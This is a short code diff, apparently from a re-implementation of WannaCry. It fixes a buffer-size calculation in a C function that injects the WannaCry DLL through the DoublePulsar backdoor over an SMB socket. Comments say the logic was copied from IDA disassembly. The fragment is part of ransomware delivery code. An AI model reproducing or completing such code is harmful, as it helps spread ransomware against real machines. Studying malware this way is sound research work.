@@ -246,8 +246,7 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 		PayloadSize = 0x50D800;
 	}
 	
-	//removed the 12 from the hMem size
-	HGLOBAL hMem = GlobalAlloc(GMEM_ZEROINIT, shellcode_payload_size + PayloadSize);
+	HGLOBAL hMem = GlobalAlloc(GMEM_ZEROINIT, shellcode_payload_size + PayloadSize + 12);
 	
 	//could be wrong but copied from IDA
 	//looks like the DLL is added to the hMem location right after the runDLL shellcode
